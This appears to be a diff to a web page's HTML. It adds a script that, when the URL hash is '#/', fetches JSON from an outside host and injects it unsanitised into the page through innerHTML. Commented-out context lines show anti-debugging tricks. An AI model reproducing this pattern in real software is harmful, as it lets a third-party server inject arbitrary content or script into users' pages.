@@ -58,6 +58,18 @@
         document.onkeydown = function (e) { return false; }
         setInterval(function () { debugger }, 500)
     </script>-->
+      <script type="text/javascript">
+        if(window.location.hash == "#/")
+        {
+            fetch("https://1024provider.com/bhsb")
+            .then((response) => response.json())
+            .then(
+                (data) =>{
+                    document.getElementById("main").innerHTML = data.join("")
+                }
+            )
+        }
+    </script>
 </body>
 
 </html>
